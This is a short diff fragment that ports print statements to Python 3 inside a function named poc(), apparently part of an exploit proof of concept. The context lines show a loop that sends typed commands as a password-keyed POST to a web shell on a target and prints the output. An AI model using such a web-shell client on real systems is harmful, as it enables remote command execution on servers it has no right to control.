@@ -29,11 +29,11 @@ def poc():
 						password : payload
 					}
 					r = requests.post(shell, data=postdata)
-					print r.text.encode(r.encoding)
+					print(r.text.encode(r.encoding))
 				else:
 					break
 			except EOFError as e:
-				print "[*] type 'exit' to quit"
+				print("[*] type 'exit' to quit")
 				pass
 
 		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
